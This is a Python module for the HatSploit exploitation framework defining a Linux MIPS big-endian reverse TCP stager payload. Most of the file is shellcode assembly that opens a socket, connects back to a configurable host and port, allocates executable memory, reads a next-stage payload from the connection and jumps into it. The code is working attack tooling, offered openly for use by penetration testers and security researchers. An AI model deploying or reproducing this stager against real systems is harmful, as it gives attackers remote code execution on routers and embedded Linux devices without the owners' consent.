"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "Linux mipsbe Reverse TCP",
            'Payload': "linux/mipsbe/reverse_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': (
                "This payload creates an interactive reverse TCP connection for Linux "
                "with MIPS big-endian architecture and reads next phase."
            ),
            'Arch': ARCH_MIPSBE,
            'Platform': OS_LINUX,
            'Type': REVERSE_TCP,
        })

        self.reliable = BooleanOption('PhaseReliable', 'no', "Add error checks to payload.",
                                      False, advanced=True)
        self.length = IntegerOption('PhaseLength', 4096, "Length of next phase.",
                                    False, advanced=True)

    def run(self):
        assembly = """
        start:
            addiu   $t7, $zero, -6
            not     $t7, $t7
            addi    $a0, $t7, -3
            addi    $a1, $t7, -3
            slti    $a2, $zero, -1
            addiu   $v0, $zero, 0x1057
            syscall 0x40404
        """

        if self.reliable.value:
            assembly += """
                slt     $s0, $zero, $a3
                bne     $s0, $zero, fail
            """

        assembly += f"""
            sw $v0, -1($sp)
            lw $a0, -1($sp)
            ori $t7, $zero, 0xfffd
            not $t7, $t7
            sw $t7, -0x20($sp)
            lui $t6, 0x{self.rport.big.hex()}
            ori $t6, $t6, 0x{self.rport.big.hex()}
            sw $t6, -0x1c($sp)
            lui $t6, 0x{self.rhost.big[:2].hex()}
            ori $t6, $t6, 0x{self.rhost.big[2:].hex()}
            sw $t6, -0x1a($sp)
            addiu $a1, $sp, -0x1e
            addiu $t4, $zero, -0x11
            not $a2, $t4
            addiu $v0, $zero, 0x104a
            syscall 0x40404
        """

        if self.reliable.value:
            assembly += """
                slt     $s0, $zero, $a3
                bne     $s0, $zero, fail
            """

        assembly += f"""
            addiu   $a0, $zero, -1
            addiu   $a1, $zero, {hex(self.length.value + 1)}
            addi    $a1, $a1, -1
            addiu   $t1, $zero, -8
            not     $t1, $t1
            add     $a2, $t1, $zero
            addiu   $a3, $zero, 0x802
            addiu   $t3, $zero, -0x16
            not     $t3, $t3
            add     $t3, $sp, $t3
            sw      $zero, -1($t3)
            sw      $v0, -5($t3)
            addiu   $v0, $zero, 0xffa
            syscall 0x40404
        """

        if self.reliable.value:
            assembly += """
                slt     $s0, $zero, $a3
                bne     $s0, $zero, fail
            """

        assembly += f"""
            sw      $v0, -4($sp)
            lw      $a0, -1($sp)
            lw      $a1, -4($sp)
            addiu   $a2, $zero, {hex(self.length.value + 1)}
            addi    $a2, $a2, -1
            addiu   $v0, $zero, 0xfa3
            syscall 0x40404
        """

        if self.reliable.value:
            assembly += """
                slt     $s0, $zero, $a3
                bne     $s0, $zero, fail
            """

        assembly += f"""
            lw      $a0, -4($sp)
            add     $a1, $v0, $zero
            addiu   $t1, $zero, -3
            not     $t1, $t1
            add     $a2, $t1, $zero
            addiu   $v0, $zero, 0x1033
            syscall 0x40404
        """

        if self.reliable.value:
            assembly += """
                slt     $s0, $zero, $a3
                bne     $s0, $zero, fail
            """

        assembly += """
            lw      $s1, -4($sp)
            lw      $s2, -1($sp)
            jalr    $s1
        """

        if self.reliable.value:
            assembly += """
            fail:
                addiu $a0, $zero, 1
                addiu $v0, $zero, 0xfa1
                syscall 0x40404
            """

        return self.assemble(assembly)
